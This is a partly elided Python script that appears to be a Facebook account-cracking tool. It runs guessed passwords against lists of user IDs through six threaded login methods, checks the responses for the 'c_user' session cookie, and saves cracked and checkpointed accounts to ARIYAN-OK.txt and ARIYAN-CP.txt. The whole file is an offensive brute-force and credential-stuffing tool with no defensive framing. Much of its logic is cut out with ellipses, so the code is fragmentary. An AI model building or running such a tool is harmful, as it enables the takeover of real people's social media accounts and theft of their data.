#created by ARIYAN aka Aryan chaudhary
#open source by ARIYAN
#github= Ariyan965
#BY BY MEY KABHI WAPIS NAHI AAUNGA AB 
#JAI NEPAL
# fb id https://www.facebook.com/profile.php?id=100000521779367
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/ARIYAN-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
def ARIYAN():
    ...
    aryan = input("✓CHOOSE>")
    if aryan =='1':ARIYAN1()
    elif aryan =='2':ARIYAN2()
    elif aryan =='3':ARIYAN3()
    elif aryan =='4':ARIYAN4()
    elif aryan =='5':ARIYAN5()
    elif aryan =='6':ARIYAN6()
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/single.pro.max0")
    else:
...
def ARIYAN1():
	...
	os.system('clear')
	print(logo)
	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (+8817)')
	print(47*'-')
	...
	print("[+]==============================================")
	ARIYANlovesyou = input("[+] [CHOOSE] :- ")
	if ARIYANlovesyou in ['y','Y','1','yes','YES','Yes']:
		ARIYAN_xd.append('y')
	else:
		ARIYAN_xd.append('n')
	print("[+]==============================================")
	...
	print("[+]==============================================")
	ARIYANtop = input("[+] [CHOOSE] :- ")
	if ARIYANtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{ARIYANfire}')
		...
		for guru in user:
			...
			if ARIYANfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif ARIYANfire =='2':yaari.submit(p,uid,pwx,tl)
			elif ARIYANfire =='3':yaari.submit(x,uid,pwx,tl)
			elif ARIYANfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif ARIYANfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif ARIYANfire =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in ARIYAN-OK.txt,ARIYAN-CP.txt')
...
def ARIYAN5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if ARIYANfire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif ARIYANfire =='2':manshera.submit(p,uid,pwx,tl)
			elif ARIYANfire =='3':manshera.submit(x,uid,pwx,tl)
			elif ARIYANfire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif ARIYANfire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif ARIYANfire =='6':manshera.submit(d,uid,pwx,tl)
			else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[ARIYAN-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in ARIYAN_xd:
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[ARIYAN-CP] '+cid+' | '+ps+'\33[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-ARIYAN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-ARIYAN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-ARIYAN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-ARIYAN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-ARIYAN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-ARIYAN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
